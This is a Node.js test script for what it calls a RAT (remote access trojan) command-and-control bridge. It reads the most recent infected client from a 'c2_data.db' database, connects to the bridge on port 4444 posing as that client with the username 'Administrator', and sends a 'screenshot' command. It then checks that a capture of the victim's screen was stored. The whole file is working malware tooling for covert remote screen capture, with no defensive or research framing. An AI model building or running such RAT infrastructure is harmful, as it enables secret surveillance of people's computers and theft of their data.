const net = require('net');
const readline = require('readline');

console.log('Testing screenshot functionality...\n');

// Get client ID from database
const Database = require('better-sqlite3');
const db = new Database('bridge/c2_data.db');

// Get most recent client
const clients = db.prepare('SELECT * FROM clients ORDER BY last_seen DESC LIMIT 1').all();

if (clients.length === 0) {
    console.log('No clients found in database. Need to connect a RAT client first.');
    process.exit(1);
}

const client = clients[0];
console.log(`Using client: ${client.id}`);
console.log(`Hostname: ${client.hostname}`);
console.log(`Last seen: ${new Date(client.last_seen).toLocaleString()}\n`);

// Create TCP connection to bridge server
const clientSocket = new net.Socket();

clientSocket.connect(4444, 'localhost', () => {
    console.log('Connected to bridge TCP server');
    
    // Send client identification (format: "CLIENT_ID|hostname|username")
    const identifyMsg = `CLIENT_ID|${client.hostname}|Administrator`;
    clientSocket.write(identifyMsg + '\n');
    console.log(`Sent identification: ${identifyMsg}`);
    
    // Wait a moment, then send screenshot command
    setTimeout(() => {
        console.log('\nSending screenshot command...');
        const screenshotCmd = 'screenshot';
        clientSocket.write(screenshotCmd + '\n');
        console.log(`Sent command: ${screenshotCmd}`);
        
        // Wait for response
        setTimeout(() => {
            console.log('\nChecking database for screenshot...');
            
            const screenshots = db.prepare('SELECT * FROM screenshots WHERE client_id = ? ORDER BY timestamp DESC').all(client.id);
            
            if (screenshots.length > 0) {
                console.log(`✓ Screenshot captured successfully!`);
                console.log(`Total screenshots for this client: ${screenshots.length}`);
                console.log(`Most recent screenshot:`);
                const latest = screenshots[0];
                console.log(`  ID: ${latest.id}`);
                console.log(`  Timestamp: ${new Date(latest.timestamp).toLocaleString()}`);
                console.log(`  Size: ${latest.image_size} bytes`);
                console.log(`  Is stream: ${latest.is_stream ? 'Yes' : 'No'}`);
            } else {
                console.log('✗ No screenshots found in database.');
                console.log('Possible issues:');
                console.log('1. RAT client not actually connected');
                console.log('2. Screenshot command not implemented in RAT client');
                console.log('3. Bridge server not processing commands correctly');
            }
            
            db.close();
            clientSocket.end();
            process.exit(0);
        }, 2000);
    }, 1000);
});

clientSocket.on('data', (data) => {
    const response = data.toString().trim();
    console.log(`Received from server: ${response}`);
});

clientSocket.on('error', (err) => {
    console.error('Socket error:', err.message);
});

clientSocket.on('close', () => {
    console.log('Connection closed');
});

// Timeout after 10 seconds
setTimeout(() => {
    console.error('\n✗ Timeout - no response');
    clientSocket.destroy();
    db.close();
    process.exit(1);
}, 10000);